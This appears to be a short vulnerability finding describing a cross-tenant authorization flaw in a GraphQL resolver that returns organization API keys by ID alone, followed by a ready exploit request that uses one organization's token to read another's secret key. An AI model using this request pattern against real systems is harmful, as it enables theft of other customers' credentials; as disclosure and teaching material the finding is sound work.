diagnosis: The OrganizationApiKey GraphQL resolver fetches API keys solely by keyID without asserting that the retrieved key belongs to the organization of the authenticated user in context. An attacker from Organization A can retrieve the secret API credentials and programmatic authorization tokens of Organization B.
exploit_request:
POST /graphql HTTP/1.1
Host: developer.saas-platform.com
Authorization: Bearer org_a_developer_token
Content-Type: application/json

{"query": "query { organizationApiKey(keyId: \"key_prod_secret_881\") { id secretKey scopes expiresAt } }"}
